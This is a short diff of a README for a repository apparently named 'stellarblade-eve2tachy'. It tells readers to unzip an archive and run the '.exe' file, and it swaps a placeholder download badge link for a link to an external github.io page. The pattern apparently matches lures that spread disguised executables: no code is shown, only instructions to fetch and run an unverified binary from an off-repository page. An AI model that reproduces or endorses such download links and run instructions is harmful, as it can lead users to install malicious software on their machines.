@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://stellarblade-eve2tachy.github.io/.github/)
 
 ## 📸 Overview
 ![stellarblade-eve2tachy-visuals](https://github.com/user-attachments/assets/b92cd2c7-7a8c-45f4-80a3-66804dd8d6a6)
